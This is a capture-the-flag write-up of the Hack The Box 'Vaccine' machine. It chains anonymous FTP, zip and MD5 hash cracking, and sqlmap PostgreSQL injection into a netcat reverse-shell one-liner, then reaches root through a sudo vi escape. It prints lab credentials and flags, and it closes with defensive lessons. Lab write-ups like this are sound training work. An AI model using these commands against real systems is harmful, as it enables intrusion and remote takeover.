---
layout: post
title: "HTB Starting Point: Vaccine"
date: 2026-07-14
category: "HTB Writeups"
difficulty: "Very Easy"
tags: [linux, ftp, sqli, postgresql, sudo, starting-point]
excerpt: "Anonymous FTP hands over a password-protected backup. Crack the zip, crack the admin hash it hides, then ride a PostgreSQL injection to a shell and a sudo vi entry to root."
---

Vaccine is a Tier 2 Starting Point box and it's really a chain of small credential
problems, each one feeding the next. Anonymous FTP gives up a backup, the backup
is a locked zip, the zip hides an admin password hash, the hash unlocks a login,
the login has a SQL injection, and the shell that gets me lands on a sudo rule
that hands over root. Nothing here is hard on its own. The lesson is how cleanly
one weak link pulls the next one loose.

## Recon

Start with a full service scan and note what's exposed.

```bash
sudo nmap -sC -sV 10.129.95.174
```

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 8.0p1 (Ubuntu) |
| 80   | HTTP    | Apache httpd 2.4.41 (Ubuntu) |

Three things stand out immediately. `nmap`'s `ftp-anon` script reports anonymous
FTP is allowed and lists a single file in the root, `backup.zip`. Port 80 serves
a "MegaCorp Login" page. SSH is there but useless without creds. The FTP file is
the obvious thread to pull first.

## Enumeration

Anonymous login, grab the file:

```bash
lftp 10.129.95.174 -u anonymous
# password: (blank, just Enter)
ls
get backup.zip
exit
```

`backup.zip` is encrypted, so I couldn't just unzip it. That's what `zip2john` is
for: it pulls the archive's password hash into a format John can chew on.

```bash
zip2john backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

rockyou cracked it in under a second: the zip password is `741852963`. Unzip with
that and two files fall out, `index.php` and `style.css`, the source of the login
page.

```bash
unzip backup.zip   # password: 741852963
```

> The one detail that unlocked the box: the login isn't backed by a database, it's
> hardcoded in the source I just recovered. `index.php` checks the username
> against `admin` and the password against a fixed MD5:
> `md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3"`.

So this isn't the end, it's a second hash to crack. One unsalted MD5, straight
into John:

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > hash.txt
john hash.txt --format=raw-md5 \
  --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

That returns `qwerty789`. Two cracks, and I've got a working web login of
`admin:qwerty789`.

## Foothold

Logging in lands on `dashboard.php`, which has a search box. The URL it drives is
`dashboard.php?search=meta`, and a search parameter that talks to a database is
exactly where I start probing for injection. I fed it to `sqlmap` along with my
authenticated session cookie, because the dashboard is behind the login and
`sqlmap` needs to be logged in too.

```bash
sqlmap --url="http://10.129.95.174/dashboard.php?search=meta" \
  --cookie="PHPSESSID=<your-session-id>" --os-shell
```

A couple of false starts here worth calling out. My first runs answered the
`follow 302 redirect?` prompt in a way that bounced `sqlmap` back to the login
page, so every parameter came back "does not appear to be injectable". Once I let
it stay on `dashboard.php` with a valid cookie, it found the bug fast: the
`search` parameter is injectable on a **PostgreSQL** back end, across boolean,
error, stacked-query and time-based techniques.

Because the DB user is a superuser, `sqlmap` can go straight to `COPY ... FROM
PROGRAM`, which runs shell commands, and `--os-shell` wraps that in a prompt:

```
os-shell> id
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

Command execution as `postgres`. The user flag is readable right there:

```
os-shell> cat /var/lib/postgresql/user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```

> The `--os-shell` prompt is blind and miserable to work in: no TTY, every command
> is a fresh HTTP round trip, and anything interactive just hangs. It's fine for
> `id` and `cat`, but you cannot escalate from inside it. The move is to use it
> once to fire a real reverse shell and never type into it again.

Start a listener locally:

```bash
nc -lvnp 4444
```

Then, from the os-shell, kick back a proper interactive shell:

```
os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.128 4444 >/tmp/f
```

Catch it, then upgrade to a real TTY so `sudo` and editors behave:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z, then: stty raw -echo; fg, then: export TERM=xterm
```

## Privilege Escalation

With a usable shell as `postgres`, check what I'm allowed to run as root. I already
know the DB password, it's sitting in the app config the box ships with
(`dashboard.php` connects as `postgres:P@s5w0rd!`), so `sudo -l` works:

```bash
sudo -l
# (root) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

That's the whole game. I can run `vi` as root against one specific file, but `vi`
doesn't care which file, it cares that it's running as root. It has a built-in
shell escape, so I open the file and drop out of it into a root shell.

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# inside vi, type:
# :!/bin/bash
```

```bash
id   # uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

Root shell, root flag, box done.

## Takeaways

- This was the intended path start to finish: FTP to the zip, zip to the source,
  source to the hash, hash to the login, login to the SQLi, SQLi to a shell,
  shell to the sudo rule. Every step handed me the key to the next.
- Two lessons cost me the most time and both are about `sqlmap`. Answer the redirect
  prompt wrong and it silently tests the login page instead of the dashboard, so
  always confirm it's actually hitting the vulnerable URL with a live cookie. And
  never try to escalate inside `--os-shell`; use it once to get a real reverse
  shell and move on.
- `sudo /bin/vi` on any file is root. Editors, pagers, and interpreters with shell
  escapes are the reason GTFOBins exists. `:!/bin/bash` from `vi` is one to keep in
  your head.
- Defensive version: don't leave anonymous FTP serving backups, don't hardcode
  credentials or run the web app's database as a superuser, and never grant `sudo`
  on an editor. Any one of those fixed breaks the chain.

> Only test targets you're allowed to. This is a retired Starting Point box on my
> own Hack The Box account. Never a live host you don't own.
